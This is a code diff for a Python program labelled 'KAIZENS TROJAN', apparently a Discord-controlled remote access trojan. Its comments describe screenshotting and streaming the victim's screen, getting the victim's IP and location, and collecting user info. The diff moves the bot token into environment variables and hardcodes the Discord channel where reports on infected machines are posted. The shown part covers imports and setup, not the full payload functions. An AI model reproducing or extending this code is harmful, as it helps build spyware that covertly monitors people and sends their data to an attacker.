@@ -1,8 +1,6 @@
 
 # for file and operating system pkg
 import os
-import shutil
-import sys
 import re
 import platform  # PKG to get user info
 import subprocess
@@ -21,8 +19,6 @@ import mss
 
 # from mss import mss  # for screenshoting victim screen
 # web requesting
-import requests
-import urllib.request
 from urllib.request import urlopen, urlretrieve
 from requests import get  # Request to web for data Public IP getter
 
@@ -36,23 +32,23 @@ from comtypes import CLSCTX_ALL
 import win32process
 import win32con
 import win32gui
-import winreg
 
 # get user current location
 import geocoder
 
+from dotenv import load_dotenv
+load_dotenv()
+     
+
 # PKG for streaming screen of the victim
-import socket
-import cv2
-import pickle
-import struct
-import imutils
-import numpy
+
 
 intents = discord.Intents.default()
-intents.messages = True
+intents.message_content = True  # ✅ This is the one that matters
+
 client = commands.Bot(command_prefix="!", intents=intents)
-bot_token = sys.argv[1]
+bot_token = os.getenv('BOT_TOKEN')
+channel_id = os.getenv('CHANNEL_ID')
 thumbnail_url = "https://cdn.discordapp.com/attachments/1305451657357819926/1318625531872411758/2.png?ex=67630139&is=6761afb9&hm=b2e618aff9fb69621fb7d8532e3160733424791fbe2f5b74d3f4c4a812ce21b1&"
 count = 0
 keys = []
@@ -124,7 +120,7 @@ async def change_wallpapers_in_folder(ctx, folder_name: str, delay: float = 0.1)
 # Function when out Bot is alive
 @client.event
 async def on_ready():
-    report_channel = client.get_channel(int(sys.argv[2])) #set the input for integer
+    report_channel = client.get_channel(1318209012151484488) #set the input for integer //channel_id
     time.sleep(2)
 
     myEmbed = discord.Embed(title="KAIZENS TROJAN")
